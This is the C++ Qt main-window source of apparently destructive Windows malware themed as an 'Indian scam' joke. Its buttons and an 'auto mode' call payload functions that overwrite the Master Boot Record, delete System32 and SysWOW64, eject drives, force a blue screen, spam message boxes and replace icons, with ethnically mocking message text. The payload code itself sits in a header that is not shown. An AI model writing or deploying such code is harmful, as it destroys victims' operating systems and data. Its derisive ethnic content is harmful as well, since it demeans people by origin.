#include "mainwindow.h"
#include "./ui_mainwindow.h"
#include "about.h"
#include <dwmapi.h>
#include <windows.h>
#include <stdio.h>
#include <winDark.h>
#include <iostream>
#include <winternl.h>
#include <encryption.h>
#include "payloads.h"
#include "elevationCheck.h"
#include <sites.h>
#include <boxspam.h>
#include <QAbstractButton>
#include <Cfgmgr32.h>
#include <QMediaPlayer>
#include <QAudioOutput>
#include <zlib.h>
using namespace std;
#pragma comment(lib,"user32")
#pragma comment (lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")


MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    this->setWindowFlags(Qt::Dialog | Qt::MSWindowsFixedSizeDialogHint);
    if(winDark::isDarkTheme())
        winDark::setDark_Titlebar(reinterpret_cast<HWND>(winId()));

    ui->setupUi(this);

    rapMusic = new QMediaPlayer(this);
    QAudioOutput * audioOutput = new QAudioOutput(this);
    rapMusic->setSource(QUrl("qrc:/sounds/Indian_Scam_Grind.mp3"));
    rapMusic->setAudioOutput(audioOutput);
    audioOutput->setVolume(1);
}

MainWindow::~MainWindow()
{
    delete ui;
}

//About menu button
void MainWindow::on_aboutButton_clicked()
{
    about about;
    about.setModal(true);
    about.exec();
}


//Destructive Payloads
void MainWindow::on_bsodButton_clicked()
{
    bsod();
}

void MainWindow::on_mbrButton_clicked()
{
    if (IsProcessElevated() == false) {
        MessageBoxW(NULL, L"The program does not have elevated permissions in order to overwrite the MBR.", L"Overwrite failed!", MB_OK | MB_ICONSTOP);
    }
    else {
        mbr();
    }
}


void MainWindow::on_sys32Button_clicked()
{
    if (IsProcessElevated() == false) {
        MessageBoxW(NULL, L"The program does not have elevated permissions in order to delete System32.", L"Delete failed!", MB_OK | MB_ICONSTOP);
    }
    else {
        sys32();

    }
}


void MainWindow::on_syswowButton_clicked()
{
    if (IsProcessElevated() == false) {
        MessageBoxW(NULL, L"The program does not have elevated permissions in order to delete SysWOW64.", L"Delete failed!", MB_OK | MB_ICONSTOP);
    }
    else {
        sys64();
    }
}


void MainWindow::on_nukeButton_clicked()
{
    if (IsProcessElevated() == false) {
        MessageBoxW(NULL, L"The program does not have elevated permissions in order to eject your drive.", L"Eject failed!", MB_OK | MB_ICONSTOP);
    }
    else {
        eject();
    }
}

void MainWindow::on_siteButton_clicked()
{
    sites();
}


//void MainWindow::on_spamButton_clicked()
//{
//    int x = rand() %1281;
//    int y = rand() %721;
//    spam(x,y);
//}


void MainWindow::on_spamButton_released()
{
    int x = rand() %1921;
    int y = rand() %1081;
    spam(x,y);
}


void MainWindow::on_rapButton_clicked(){

    rapMusic->playbackState();
    if (rapMusic->playbackState() == QMediaPlayer::PlayingState) {
        rapMusic->stop();

    }
    else if (rapMusic->playbackState() == QMediaPlayer::StoppedState) {
       rapMusic->play();
    }
}


void MainWindow::on_repiconButton_clicked()
{
    replaceIcons();
}
void MainWindow::on_ranfileButton_clicked()
{
    MessageBoxW(NULL, L"This feature was so buggy I decided to disable it.", L"Disabled", MB_OK | MB_ICONEXCLAMATION);
//    PWSTR desktop = NULL;

//    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &desktop);
//    BOOL ret = PathAppend(desktop, L"\\krabby.zip");
//    BOOL MF;
//    MF = CopyFile(
//                L".\\krabby.zip",
//                desktop,
//                TRUE);
}





void MainWindow::on_auNDesButton_clicked()
{
    if (IsProcessElevated() == false) {
        MessageBoxW(NULL, L"The program does not have elevated permissions in order to start auto mode.", L"Mode failed!", MB_OK | MB_ICONSTOP);
    }
    else {
        if (enabled == 0) {
            rapMusic->play();
            enabled++;
            MessageBoxW(NULL, L"The wrath of indian destruction will now occur.", L"Start", MB_OK | MB_ICONINFORMATION);
            sites();
            MessageBoxW(NULL, L"'like like like'", L"like like like", MB_OK | MB_ICONINFORMATION);
            mbr();
            sys32();
            MessageBoxW(NULL, L"'i wanna eat jin kazama ass - kl2022'", L"HAHAR", MB_OK | MB_ICONINFORMATION);
            eject();
            MessageBoxW(NULL, L"'HEY!!!'", L"STOP!", MB_OK | MB_ICONINFORMATION);
            bsod();

        }
        else {
            MessageBoxW(NULL, L"Auto mode is already activated!", L"Mode failed!", MB_OK | MB_ICONSTOP);
        }
    }
}

